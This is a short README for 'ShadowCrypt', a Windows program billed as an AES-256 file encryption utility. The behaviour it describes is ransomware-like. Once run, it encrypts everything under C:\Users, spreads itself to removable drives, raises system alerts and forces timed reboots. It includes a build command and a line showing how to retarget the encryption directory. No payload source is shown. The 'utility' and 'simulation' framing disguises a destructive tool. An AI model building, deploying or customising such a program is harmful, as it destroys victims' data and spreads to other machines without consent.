# 🛡️ ShadowCrypt

### Lightweight File & Directory Encryption Utility for Windows  
_Advanced AES-256 encryption engine with simulated network replication support._

---

## ⚙️ Features

- 🔐 **AES-256 Bit File Encryption**
- 📁 **Recursive Directory Encryption**
- 💾 **Encrypted Output File Management**
- 🧬 **Self-Replication Simulation to External Drives**
- 💬 **Custom System Alerts & UI Notifications**
- 🔁 **Timed System Reboot for Security Enforcement**

---

## 🧠 How It Works

ShadowCrypt uses the Windows CryptoAPI to generate and apply strong AES-256 encryption to files in a given directory.  
It also demonstrates how binaries can spread across removable drives in a controlled environment.

---

## 🚀 Usage

1. 🔧 **Build the Project**
   - Open in Visual Studio or compile via command line:
     ```bash
     g++ main.cpp resource.res -o ShadowCrypt.exe -lcrypt32 -luser32 -lgdi32
     ```

2. 🎯 **Run the Executable**
   - Automatically encrypts files under `C:\Users`
   - Shows a system alert with status
   - Simulates spreading to other drives with a dummy payload

---

## 🧩 Customize

- Want a different icon? Replace `hacker.ico` in the `resource.rc` file.
- Change the encryption target directory inside `main()`:
  ```cpp
  encryptDirectoryAES("C:\\Your\\Target\\Path");
